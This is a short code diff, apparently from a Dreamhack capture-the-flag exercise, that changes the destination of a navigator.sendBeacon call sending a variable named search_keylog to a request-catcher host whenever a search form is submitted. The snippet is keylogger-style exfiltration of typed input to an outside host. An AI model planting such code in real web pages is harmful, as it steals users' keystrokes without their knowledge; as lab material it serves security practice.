@@ -10,7 +10,7 @@ const form = search_word.closest("form");
 
 form.addEventListener("submit", () => {
   navigator.sendBeacon(
-    "https://hbeqqxv.request.dreamhack.games",
+    "https://ainvyph.request.dreamhack.games",
     search_keylog
   );
 });
